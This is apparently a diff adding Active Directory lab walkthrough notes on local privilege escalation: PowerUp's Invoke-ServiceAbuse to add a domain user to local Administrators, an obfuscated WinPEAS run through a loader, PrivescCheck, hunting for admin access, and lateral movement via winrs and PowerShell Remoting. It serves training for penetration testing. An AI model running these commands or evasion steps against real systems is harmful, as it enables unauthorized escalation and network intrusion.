@@ -117,3 +117,66 @@ sc.exe sdshow <servicename>
 ```
 {% endtab %}
 {% endtabs %}
+
+## Local Privilege Escalation using Jenkins - PowerUp
+
+{% tabs %}
+
+```batch
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+```powershell
+. C:\AD\Tools\PowerUp.ps1
+Invoke-AllChecks
+```
+
+### Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.
+```powershell
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
+```
+### We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!
+
+## Local Privilege Escalation - WinPEAS
+### You can use WinPEAS using the following command. Note that we use an obfuscated version of WinPEAS:
+```batch
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
+```
+
+## Local Privilege Escalation - PrivEscCheck
+### Similarly, we can use PrivEscCheck (https://github.com/itm4n/PrivescCheck) for a nice summary of possible privilege escalation opportunities:
+
+```powershell
+. C:\AD\Tools\PrivEscCheck.ps1
+Invoke-PrivescCheck
+```
+
+## Hunt for Local Admin access
+### Now for the next task, to identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1:
+
+```batch
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+```powershell
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
+```
+
+### So, studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:
+
+```batch
+winrs -r:dcorp-adminsrv cmd
+
+set username
+
+set computername
+```
+
+### We can also use PowerShell Remoting:
+
+```powershell
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+$env:username
+```
+
+{% endtabs %}
